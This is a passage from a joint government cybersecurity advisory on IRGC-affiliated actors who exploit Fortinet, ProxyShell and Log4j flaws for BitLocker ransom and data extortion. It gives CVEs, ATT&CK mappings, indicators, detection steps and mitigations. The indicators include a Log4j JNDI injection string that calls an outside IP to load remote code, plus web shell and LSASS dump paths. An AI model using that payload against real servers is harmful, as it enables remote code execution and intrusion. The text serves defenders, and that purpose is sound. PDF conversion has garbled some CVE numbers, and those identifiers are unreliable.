Vulnerabilities for Data Extortion and Disk Encryption for Ransom Operations
cisa.gov/uscert/ncas/alerts/aa22-257a

Summary
Actions to take today to protect against ransom operations:
• Keep systems and software updated and prioritize remediating known exploited vulnerabilities.
• Enforce MFA.
• Make offline backups of your data.
This joint Cybersecurity Advisory (CSA) is the result of an analytic effort among the Federal Bureau of Investigation (FBI), the
Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), U.S. Cyber Command (USCC) - Cyber
National Mission Force (CNMF), the Department of the Treasury (Treasury), the Australian Cyber Security Centre (ACSC), the
Canadian Centre for Cyber Security (CCCS), and the United Kingdom’s National Cyber Security Centre (NCSC) to highlight continued
malicious cyber activity by advanced persistent threat (APT) actors that the authoring agencies assess are affiliated with the Iranian
Government’s Islamic Revolutionary Guard Corps (IRGC). Note: The IRGC is an Iranian Government agency tasked with defending
the Iranian Regime from perceived internal and external threats. Hereafter, this advisory refers to all the coauthors of this advisory as
"the authoring agencies."
This advisory updates joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet
Vulnerabilities in Furtherance of Malicious Activities, which provides information on these Iranian government-sponsored APT actors
exploiting known Fortinet and Microsoft Exchange vulnerabilities to gain initial access to a broad range of targeted entities in
furtherance of malicious activities, including ransom operations. The authoring agencies now judge these actors are an APT group
affiliated with the IRGC.
Since the initial reporting of this activity in the FBI Liaison Alert System (FLASH) report APT Actors Exploiting Fortinet Vulnerabilities
to Gain Access for Malicious Activity from May 2021, the authoring agencies have continued to observe these IRGC-affiliated actors
exploiting known vulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the
authoring agencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities for initial access. The IRGCaffiliated actors have used this access for follow-on activity, including disk encryption and data extortion, to support ransom
operations.
The IRGC-affiliated actors are actively targeting a broad range of entities, including entities across multiple U.S. critical infrastructure
sectors as well as Australian, Canadian, and United Kingdom organizations. These actors often operate under the auspices of Najee
Technology Hooshmand Fater LLC, based in Karaj, Iran, and Afkar System Yazd Company, based in Yazd, Iran. The authoring
agencies assess the actors are exploiting known vulnerabilities on unprotected networks rather than targeting specific targeted
entities or sectors.
This advisory provides observed tactics, techniques, and indicators of compromise (IOCs) that the authoring agencies assess are
likely associated with this IRGC-affiliated APT. The authoring agencies urge organizations, especially critical infrastructure
organizations, to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from
these IRGC-affiliated cyber actors.

Technical Details
Threat Actor Activity
As reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities
in Furtherance of Malicious Activities, the authoring agencies have observed Iranian government-sponsored APT actors scanning for
and/or exploiting the following known Fortinet FortiOS and Microsoft Exchange server vulnerabilities since early 2021 to gain initial
access to a broad range of targeted entities: CVE-2018-13379, CVE-2020-12812, CVE-2019-5591, and CVE-2021-34473 (a
ProxyShell vulnerability). The authoring agencies have also observed these APT actors leveraging CVE-2021-34473 against U.S.
1/10

networks in combination with ProxyShell vulnerabilities CVE-2021-34523 and CVE-2021-31207. The NCSC judges that Yazd, Iranbased company Afkar System Yazd Company is actively targeting UK organizations. Additionally, ACSC judges that these APT actors
have used CVE-2021-34473 in Australia to gain access to systems. The APT actors can leverage this access for further malicious
activities, including deployment of tools to support ransom and extortion operations, and data exfiltration.
Since the activity was reported in 2021, these IRGC-affiliated actors have continued to exploit known vulnerabilities for initial access.
In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring agencies have observed these APT actors
exploiting VMware Horizon Log4j vulnerabilities CVE-2021-44228 (“Log4Shell”), CVE-2021-45046, and CVE-2021-45105 for initial
access.
The IRGC-affiliated actors have used their access for ransom operations, including disk encryption and extortion efforts. After gaining
access to a network, the IRGC-affiliated actors likely determine a course of action based on their perceived value of the data.
Depending on the perceived value, the actors may encrypt data for ransom and/or exfiltrate data. The actors may sell the data or use
the exfiltrated data in extortion operations or “double extortion” ransom operations where a threat actor uses a combination of
encryption and data theft to pressure targeted entities to pay ransom demands.
IRGC-affiliated actor activity observed by the authoring agencies includes:
In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-202131207) on a Microsoft Exchange server to gain access to the network of a U.S. police department. The actors used their access
to move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for ransom.
In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-202131207), on a Microsoft Exchange server to gain access to the network of a U.S. regional transportation company. The actors
used their access to move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for
ransom. This activity disrupted the transportation company’s operations for an extended period.
In February 2022, the actors exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE-202145105) in a VMware Horizon application to gain access to the network of a U.S. municipal government, move laterally within the
network, establish persistent access, initiate crypto-mining operations, and conduct additional malicious activity.
In February 2022, the actors may have exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE2021) to gain access to the network of a U.S. aerospace company. The actors leveraged a server that the authoring agencies
assess is associated with the IRGC-affiliated actors to exfiltrate data from the company's network.
MITRE ATT&CK® Tactics and Techniques
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11. See Appendix B for a table of the MITRE
ATT&CK tactics and techniques observed.
The authoring agencies assess the following tactics and techniques are associated with this activity.
Resource Development [TA0042]
The IRGC-affiliated actors have used the following malicious and legitimate tools [T1588.001, T1588.002] for a variety of tactics
across the enterprise spectrum:
Fast Reverse Proxy (FRP) for command and control (C2)
Plink for C2
Remote Desktop Protocol (RDP) for lateral movement
BitLocker for data encryption
SoftPerfect Network Scanner for system network configuration discovery
Note: For additional tools used by these IRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber
Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
Initial Access [TA0001]
As stated in the Technical Details section previously reported in joint CSA Iranian Government-Sponsored APT Cyber Actors
Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the IRGC-affiliated actors gained
initial access by exploiting known vulnerabilities [T1190].
The following IOCs, observed as of March 2022, are indicative of ProxyShell vulnerability exploitation on targeted entity networks:

2/10

Web shells with naming conventions aspx_[11 randomly generated alphabetic characters].aspx, login.aspx, or default.aspx in
any of the following directories:
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\
C:\inetpub\wwwroot\aspnet_client\
The following IOCs, observed as of December 2021, are indicative of Log4j vulnerability exploitation on targeted entity networks:
${jndi:ldap//148.251.71.182:1389/RCE} (user agent string)
RCE.class
Execution [TA0002]
The IRGC-affiliated actors may have made modifications to the Task Scheduler [T1053.005]. These modifications may display as
unrecognized scheduled tasks or actions. Specifically, the below established tasks may be associated with this activity:
Wininet
Wininet’
WinLogon
CacheTask
Note: The potential exists that tasks associated with CacheTask or Wininet may be legitimate. For additional tasks used by these
IRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and
Fortinet Vulnerabilities in Furtherance of Malicious Activities.
Persistence [TA0003]
The IRGC-affiliated actors established new user accounts on domain controllers, servers, workstations, and active directories
[T1136.001, T1136.002]. The actors enabled a built-in Windows account (DefaultAccount) and escalated privileges to gain
administrator-level access to a network. Some of these accounts appear to have been created to look similar to other existing
accounts on the network, so specific account names may vary per organization. In addition to unrecognized user accounts or
accounts established to masquerade as existing accounts, the following account usernames may be associated with this activity:
Domain Admin
it_admin
DefaultAccount
Default01
Note: For additional account usernames associated with this activity, see joint CSA Iranian Government-Sponsored APT Cyber Actors
Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
Exfiltration [TA0010]
The authoring agencies have observed the IRGC-affiliated actors dumping and subsequently exfiltrating the Local Security Authority
Subsystem Service (LSASS) process memory on targeted entity networks in furtherance of credential harvesting. The following IOCs
are associated with data exfiltration from targeted entity networks:
C:\Windows\Temp\sassl[.]pmd
C:\Windows\Temp\ssasl[.]zip
C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]dmp
C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]zip
Impact [TA0040]
The IRGC-affiliated actors forced BitLocker activation on host networks to encrypt data [T1486] and held the decryption keys for
ransom. The corresponding ransom notes were sent to the targeted entity, left on the targeted entity network as a .txt file or printed on
the targeted entity’s networked printer(s). The notes included the following contact information:
@BuySafety (Telegram)
@WeRBits (Telegram)
+93794415076 (WhatsApp)
werbits@onionmail[.]org
buysafety@onionmail[.]org
yacashcash@rambler[.]ru

DETECTION
The authoring agencies recommend that organizations using Microsoft Exchange servers, Fortinet devices, and/or VMware Horizon
applications investigate potential suspicious activity in their networks.
Search for IOCs. Collect known-bad IOCs and search for them in network and host artifacts.
Note: Refer to Appendix A for IOCs.
Review Log4j vulnerabilities, including CVE-2021-44228, CVE-2021-45046, and CVE-2021- 45105.
Review Microsoft Exchange ProxyShell vulnerabilities, including CVE-2021-34473, CVE-2021- 34523, and CVE-2021-31207.
As a precaution, review additional Microsoft Exchange vulnerabilities, including CVE-2021- 31196, CVE-2021-31206, CVE2021-33768, CVE-2021-33766, and CVE-2021-34470 because the authoring agencies have seen the actors broadly target
Microsoft Exchange servers.
Investigate exposed Microsoft Exchange servers, both patched and unpatched, for compromise.
Review Fortinet FortiOS vulnerabilities, including CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591.
Review VMware vulnerabilities, including any relevant vulnerabilities listed on the VMware security advisory page.
Investigate changes to RDP, firewall, and Windows Remote Management (WinRM) configurations that may allow malicious
cyber actors to maintain persistent access.
Review domain controllers, servers, workstations, and active directories for new or unrecognized user accounts.
Review Task Scheduler for unrecognized scheduled tasks. Additionally, manually review operating-system and scheduled tasks
—including each step these tasks perform—for unrecognized “actions.”
Review antivirus logs for indications they were unexpectedly turned off.
Look for WinRAR and FileZilla in unexpected locations.
Review servers and workstations for malicious executable files masquerading as legitimate Windows processes. Malicious files
may not be found in the expected directory and may have cmd.exe or powershell.exe as their parent process.
Note: For additional approaches on uncovering malicious cyber activity, see joint advisory Technical Approaches to Uncovering and
Remediating Malicious Activity, authored by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the
United Kingdom.

Mitigations
The authoring agencies urge network defenders to prepare for and mitigate potential cyber threats immediately by implementing the
mitigations below.
Implement and Enforce Backup and Restoration Policies and Procedures
Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration. These
practices safeguard an organization’s continuity of operations or at least minimize potential downtime from a ransomware or
other destructive data incident and protect against data losses.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s
data infrastructure.
Activate BitLocker on all networks and securely back up BitLocker keys with Microsoft and with an independent offline
backup.
Create, maintain, and exercise a basic cyber incident response plan that includes response procedures for a ransom incident.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically
separate, segmented, secure location (e.g., hard drive, storage device, the cloud).
Patch and Update Systems
U.S. federal, state, local, tribal, and territorial (SLTT) government and critical infrastructure organizations: Implement free CISA
Cyber Hygiene Services Vulnerability Scanning to enable continuous scans of public, static IPs for accessible services and
vulnerabilities.
Install updates/patch operating systems, software, and firmware as soon as updates/patches are released. Regularly check
software updates and end-of-life notifications. Consider leveraging a centralized patch management system to automate and
expedite the process.
Immediately patch software affected by vulnerabilities identified in this advisory: CVE-2021- 34473, CVE-2018-13379, CVE2020-12812, CVE-2019-5591, CVE-2021-34523, CVE-2021- 31207, CVE-2021-44228, CVE-2021-45046, CVE-2021-45105,
CVE-2021-31196, CVE-2021- 31206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470.

4/10

Evaluate and Update Blocklists and Allowlists
Regularly evaluate and update blocklists and allowlists.
If FortiOS is not used by your organization, add the key artifact files used by FortiOS to your organization’s execution blocklist.
Prevent any attempts to install or run this program and its associated files.
Implement Network Segmentation
Implement network segmentation to restrict a malicious threat actor’s lateral movement.
Secure User Accounts
Audit user accounts with administrative privileges and configure access controls under the principles of least privilege and
separation of duties.
Require administrator credentials to install software.
Implement Multifactor Authentication
Use multifactor authentication where possible, particularly for webmail, virtual private networks (VPNs), accounts that access
critical systems, and privileged accounts that manage backups.
Use Strong Passwords
Require all accounts with password logins to have strong, unique passwords. See CISA Tip Choosing and Protecting
Passwords and National Institute of Standards and Technology (NIST) Special Publication 800-63B: Digital Identity Guidelines
for more information.
Secure and Monitor RDP and other Potentially Risky Services
If you use RDP, restrict it to limit access to resources over internal networks. After assessing risks, if your organization deems
RDP operationally necessary, restrict the originating sources, and require MFA to mitigate credential theft and reuse. If RDP
must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the
connection before allowing RDP to connect to internal devices.
Disable unused remote access/RDP ports.
Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts (to block brute force
campaigns), and log RDP login attempts.
Use Antivirus Programs
Install and regularly update antivirus and anti-malware software on all hosts.
Secure Remote Access
Only use secure networks.
Consider installing and using a VPN for remote access.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security
program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring
agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques
described in this advisory.
To get started:
1. Select an ATT&CK technique described in this advisory (see Appendix B).
2. Align your security technologies against the technique.
3. Test your technologies against the technique.
4. Analyze your detection and prevention technologies performance.
5. Repeat the process for all security technologies to obtain a set of comprehensive performance data.
6. Tune your security program, including people, processes, and technologies, based on the data generated by this process.
The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal
performance against the MITRE ATT&CK techniques identified in this advisory.

RESPONDING TO RANSOMWARE OR EXTORTION INCIDENTS
5/10

If a ransomware or extortion incident occurs at your organization:
Follow the Ransomware Response Checklist on page 11 of the CISA-Multi-State Information Sharing and Analysis Center (MSISAC) Joint Ransomware Guide.
Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be
performed using an isolated, trusted system to avoid exposing backups to potential compromise.
Follow the notification requirements as outlined in your cyber incident response plan.
U.S. organizations: Report incidents to FBI at a local FBI Field Office or the FBI's 24/7 CyWatch at (855)292-3937 or
cywatch@fbi.gov, CISA’s 24/7 Operations Center at report@cisa.gov or (888) 282-0870, or the U.S. Secret Service
(USSS) at a USSS Field Office.
Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and
